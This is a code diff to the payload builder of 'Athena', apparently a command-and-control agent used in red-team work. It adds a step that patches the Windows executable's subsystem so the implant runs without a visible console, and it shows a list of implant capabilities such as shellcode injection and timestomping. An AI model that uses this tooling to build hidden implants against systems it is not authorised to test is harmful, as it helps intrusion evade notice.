@@ -9,6 +9,17 @@ import tempfile
 import traceback
 import subprocess
 import json
+import pefile
+
+def prepareWinExe(output_path):
+    pe = pefile.PE(os.path.join(output_path, "Athena.exe"))
+    pe.OPTIONAL_HEADER.Subsystem = 2
+    pe.write(os.path.join(output_path, "Athena_Headless.exe"))
+    pe.close()
+    os.remove(os.path.join(output_path, "Athena.exe"))
+    os.rename(os.path.join(output_path, "Athena_Headless.exe"), os.path.join(output_path, "Athena.exe"))
+    pass
+
 
 def buildSlack(self, agent_build_path, c2):
     baseConfigFile = open("{}/AthenaSlack/Base.txt".format(agent_build_path.name), "r").read()
@@ -25,7 +36,6 @@ def buildSlack(self, agent_build_path, c2):
             baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
     with open("{}/AthenaSlack/Slack.cs".format(agent_build_path.name), "w") as f:
         f.write(baseConfigFile)
-
 def buildDiscord(self, agent_build_path, c2):
     baseConfigFile = open("{}/AthenaDiscord/Base.txt".format(agent_build_path.name), "r").read()
     baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
@@ -41,8 +51,6 @@ def buildDiscord(self, agent_build_path, c2):
            baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
     with open("{}/AthenaDiscord/Discord.cs".format(agent_build_path.name), "w") as f:
         f.write(baseConfigFile)
-
-
 def buildSMB(self, agent_build_path, c2):
     baseConfigFile = open("{}/AthenaSMB/Base.txt".format(agent_build_path.name), "r").read()
     baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
@@ -57,8 +65,7 @@ def buildSMB(self, agent_build_path, c2):
         else:
            baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
     with open("{}/AthenaSMB/SMB.cs".format(agent_build_path.name), "w") as f:
-        f.write(baseConfigFile)
-    
+        f.write(baseConfigFile)   
 def buildHTTP(self, agent_build_path, c2):
     baseConfigFile = open("{}/AthenaHTTP/Base.txt".format(agent_build_path.name), "r").read()
     baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
@@ -86,7 +93,6 @@ def buildHTTP(self, agent_build_path, c2):
            baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
     with open("{}/AthenaHTTP/HTTP.cs".format(agent_build_path.name), "w") as f:
         f.write(baseConfigFile)
-
 def buildWebsocket(self, agent_build_path, c2):
     baseConfigFile = open("{}/AthenaWebsocket/Base.txt".format(agent_build_path.name), "r").read()
     baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
@@ -114,28 +120,22 @@ def buildWebsocket(self, agent_build_path, c2):
            baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
     with open("{}/AthenaWebsocket/Websocket.cs".format(agent_build_path.name), "w") as f:
         f.write(baseConfigFile)
-
 def addCommand(agent_build_path, command_name, project_name):
     project_path = os.path.join(agent_build_path.name, "AthenaPlugins", command_name, "{}.csproj".format(command_name))
     p = subprocess.Popen(["dotnet", "add", project_name, "reference", project_path], cwd=agent_build_path.name)
     p.wait()
-
 def addProfile(agent_build_path, profile):
     project_path = os.path.join(agent_build_path.name, "Athena{}".format(profile), "Athena.Profiles.{}.csproj".format(profile))
     p = subprocess.Popen(["dotnet", "add", "reference", project_path], cwd=os.path.join(agent_build_path.name, "Athena"))
     p.wait()
-
 def addForwarder(agent_build_path, profile):
     project_path = os.path.join(agent_build_path.name, "Athena.Forwarders.{}".format(profile), "Athena.Forwarders.{}.csproj".format(profile))
     p = subprocess.Popen(["dotnet", "add", "reference", project_path], cwd=os.path.join(agent_build_path.name, "Athena"))
     p.wait()
-
 def addHandler(agent_build_path, handler_path):
     #project_path = os.path.join(agent_build_path.name, "Athena.Forwarders.{}".format(profile), "Athena.Forwarders.{}.csproj".format(profile))
     p = subprocess.Popen(["dotnet", "add", "reference", handler_path], cwd=os.path.join(agent_build_path.name, "Athena"))
     p.wait()
-
-
 
 # define your payload type class here, it must extend the PayloadType class though
 class athena(PayloadType):
@@ -277,9 +277,10 @@ class athena(PayloadType):
             stdout_err = ""
             loadable_commands = ["arp","cat","cd","coff","cp","crop","ds","drives","env","farmer","get-clipboard","get-localgroup","get-sessions","get-shares","hostname","ifconfig","inline-exec",
             "kill","ls","mkdir","mv","nslookup","patch","ps","pwd","reg","rm","sftp","shell","shellcode", "shellcode-inject","ssh","tail","test-port","timestomp","uptime","wget","whoami","win-enum-resources"]
-
+            output_type = "Exe"
             build_msg += "Determining selected OS...{}".format(self.selected_os) + '\n'
             if self.selected_os.upper() == "WINDOWS":
+                output_type = "WinExe"
                 directives += ";WINBUILD"
                 rid = "win-" + self.get_parameter("arch")
             elif self.selected_os.upper() == "LINUX":
@@ -336,7 +337,7 @@ class athena(PayloadType):
                 resp.build_stdout += stdout_err
                 return resp
 
-            command = "dotnet publish Athena -r {} -c {} --nologo --verbosity=q --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} /p:PublishTrimmed={} /p:PublishAOT={} /p:DebugType=None /p:DebugSymbols=false /p:SolutionDir={} /p:HandlerOS={} {}".format(
+            command = "dotnet publish Athena -r {} -c {} --nologo --verbosity=q --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} /p:PublishTrimmed={} /p:PublishAOT={} /p:DebugType=None /p:DebugSymbols=false /p:SolutionDir={} /p:HandlerOS={} /p:AthenaOutputType={} {}".format(
                 rid, 
                 self.get_parameter("configuration"), 
                 self.get_parameter("self-contained"), 
@@ -346,6 +347,7 @@ class athena(PayloadType):
                 False, #Setting native-aot to false temporarily while I explore keeping it or not.
                 agent_build_path.name, 
                 self.selected_os.lower(),
+                output_type,
                 add_profile_params)
             
             output_path = "{}/Athena/bin/{}/net7.0/{}/publish/".format(agent_build_path.name,self.get_parameter("configuration").capitalize(), rid)
@@ -400,6 +402,9 @@ class athena(PayloadType):
                         profile = c2.get_c2profile()
 
             if os.path.exists(output_path):
+                if self.selected_os.upper() == "WINDOWS":
+                    prepareWinExe(output_path) #Force it to be headless
+
                 # Build worked, return payload
                 shutil.make_archive(f"{agent_build_path.name}/output", "zip", f"{output_path}")
                 build_msg += "Output Directory of zipfile: " + str(os.listdir(agent_build_path.name)) + "\n"
